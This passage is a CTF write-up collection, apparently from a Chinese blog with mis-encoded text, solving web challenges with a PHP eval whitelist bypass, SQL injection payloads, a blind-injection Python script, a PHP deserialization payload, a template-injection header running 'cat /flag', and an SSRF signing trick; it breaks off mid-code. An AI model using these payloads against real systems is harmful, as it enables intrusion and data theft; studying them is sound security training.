å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>åˆ©ç”¨ç™½åå•ä¸­çš„å‡½æ•°æ¥æ„é€ å‡º<code>$_GET[pi]</code>å’Œ<code>$_GET[abs]</code></p><p><code>exp.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dec_hex2bin</span> = <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;hex2bin&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);<span class="comment">//37907361743</span></span><br><span class="line"><span class="variable">$hex2bin</span> = <span class="title function_ invoke__">base_convert</span>(<span class="variable">$dec_hex2bin</span>,<span class="number">10</span>,<span class="number">36</span>);<span class="comment">//hex2bin</span></span><br><span class="line"><span class="variable">$dec_GET</span> = <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="number">16</span>,<span class="number">10</span>);<span class="comment">//1598506324</span></span><br><span class="line"><span class="comment">// $pi = $hex2bin(dechex($dec_GET));//_GET</span></span><br><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$pi</span>;</span><br><span class="line"><span class="comment">//?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;pi&#125;)($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>æ„é€ å‡º<code>getallheaders</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dec_exec</span> = <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;exec&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);<span class="comment">//696468</span></span><br><span class="line"><span class="variable">$dec_head</span> = <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;getallheaders&#x27;</span>,<span class="number">30</span>,<span class="number">10</span>);<span class="comment">//8768397090111664438</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=$pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))()&#123;1&#125;)</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">1=cat /flag</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>æ·»åŠ <code>XFF</code>å¤´è®¿é—®<code>/flag.php</code>å³å¯</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>æ³¨å†Œè´¦å·åç™»å½•ï¼Œè¿›å…¥å¹¿å‘Šå‘å¸ƒé¡µé¢ï¼Œå‘ç°å¹¿å‘Šåå­—å­˜åœ¨<code>sqlæ³¨å…¥</code>ï¼Œæµ‹è¯•å<code>payload</code>å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#åˆ—æ•°ä¸º22</span><br><span class="line">1&#x27;/**/group/**/by/**/22,&#x27;1</span><br><span class="line">1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">#å›æ˜¾ç‚¹ä¸º2å’Œ3</span><br><span class="line">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br><span class="line">#è¡¨åï¼šads,users</span><br><span class="line">-1&#x27;union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br><span class="line">#å‘ç°å­˜åœ¨flagå­—æ®µ</span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`2`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br><span class="line">#è·å–flag</span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>æºç ä¸­å‘ç°<code>&lt;a href=&quot;./time.php?source&quot;&gt;&lt;/a&gt;&lt;/p&gt;</code>ï¼Œè®¿é—®å³å¯è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç®€å•ååºåˆ—åŒ–ï¼Œåœ¨<code>phpinfo</code>é‡Œé¢æœç´¢<code>flag</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;phpinfo();&quot;;</span><br><span class="line">        $this-&gt;b = &quot;assert&quot;;//systemè¢«banäº†</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp();</span><br><span class="line">print_r(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>disable_functionsï¼š</strong></p><p>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir</p></blockquote><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>å³ä¸Šè§’å‘ç°<code>Current IP:</code>ï¼Œæ·»åŠ <code>header</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>ç”¨<code>burp</code>æ¥<code>fuzz</code>ä¸‹å‘ç°<code>^</code>æ²¡è¢«<code>ban</code>ï¼Œæ•…çŒœæµ‹æ˜¯<code>å¼‚æˆ–æ³¨å…¥</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://764f49d1-6794-4019-82f7-ef1cdc6a8761.node4.buuoj.cn:81/search.php?id=&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># database geek</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^(ord(substr((select(database())),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># table F1naI1y</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># column id,username,password</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># flag </span></span><br><span class="line">        payload = <span class="string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        response = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Click&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">    flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># #encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç»•è¿‡<code>self.checkSign()</code>ï¼Œå¹¶ä¸”ä¼ å…¥çš„<code>action</code>éœ€è¦åŒæ—¶åŒ…å«<code>scan</code>å’Œ<code>read</code>ï¼Œç„¶å<code>if &quot;scan&quot; in self.action:</code>æ‰§è¡Œå°†<code>flag.txt</code>ä¸­çš„æ•°æ®å†™å…¥<code>result.txt</code>ä¸­ï¼Œç»§ç»­<code>if &quot;read&quot; in self.action:</code>æ‰§è¡Œè¯»å–<code>result.txt</code>ä¸­çš„æ•°æ®ï¼Œå¹¶ä¸”æ”¾åœ¨<code>result[&#39;data&#39;]</code> ä¸­ ï¼Œ <code>return json.dumps(task.Exec())  </code> æ¥ç€è¿”å›ä»¥<code>json</code>çš„å½¢å¼è¿”å›åˆ°å®¢æˆ·ç«¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#f821a364c99c7ba8e6e7017f1a64c8c6</span><br><span class="line">/geneSign?param=flag.txtread</span><br><span class="line">#&#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;flag&#123;27cff900-1dbd-4895-a5d4-39c4bd09ddc2&#125;\n&quot;&#125;</span><br><span class="line">/De1ta?param=flag.txt</span><br><span class="line">Cookie:action=readscan;sign=f821a364c99c7ba8e6e7017f1a64c8c6</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/RABCDXB/article/details/115412359">[De1CTF 2019]SSRF Me</a></p></blockquote><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>æŸ¥çœ‹æºç å³å¯å¾—åˆ°<code>flag</code></p><p>ç›´æ¥å¤åˆ¶ç²˜è´´æ–‡æœ¬ä¹Ÿå¯</p><blockquote><p>Resistance is futile! Bring back Futurella or weâ€™ll invade!</p><p>Also, the flag is flag{61cc71f2-8927-458f-a1a5-74a14fab8b97}</p></blockquote><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>æŸ¥çœ‹æºç è·å¾—ä»£ç å’Œæç¤º</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">@app.route(&#x27;/getUrl&#x27;,</span> <span class="string">methods=[&#x27;GET&#x27;,</span> <span class="string">&#x27;POST&#x27;</span><span class="string">])</span></span><br><span class="line"><span class="string">def</span> <span class="string">getUrl():</span></span><br><span class="line">    <span class="string">url</span> <span class="string">=</span> <span class="string">request.args.get(&quot;url&quot;)</span></span><br><span class="line">    <span class="string">host</span> <span class="string">=</span> <span class="string">parse.urlparse(url).hostname</span></span><br><span class="line">    <span class="string">if</span> <span class="string">host</span> <span class="string">==</span> <span class="attr">&#x27;suctf.cc&#x27;:</span></span><br><span class="line">        <span class="string">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span></span><br><span class="line">    <span class="string">parts</span> <span class="string">=</span> <span class="string">list(urlsplit(url))</span></span><br><span class="line">    <span class="string">host</span> <span class="string">=</span> <span class="string">parts[1]</span></span><br><span class="line">    <span class="string">if</span> <span class="string">host</span> <span class="string">==</span> <span class="attr">&#x27;suctf.cc&#x27;:</span></span><br><span class="line">        <span class="string">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> <span class="string">+</span> <span class="string">host</span></span><br><span class="line">    <span class="string">newhost</span> <span class="string">=</span> []</span><br><span class="line">    <span class="string">for</span> <span class="string">h</span> <span class="string">in</span> <span class="string">host.split(&#x27;.&#x27;):</span></span><br><span class="line">        <span class="string">newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="string">parts[1]</span> <span class="string">=</span> <span class="string">&#x27;.&#x27;</span><span class="string">.join(newhost)</span></span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    <span class="string">finalUrl</span> <span class="string">=</span> <span 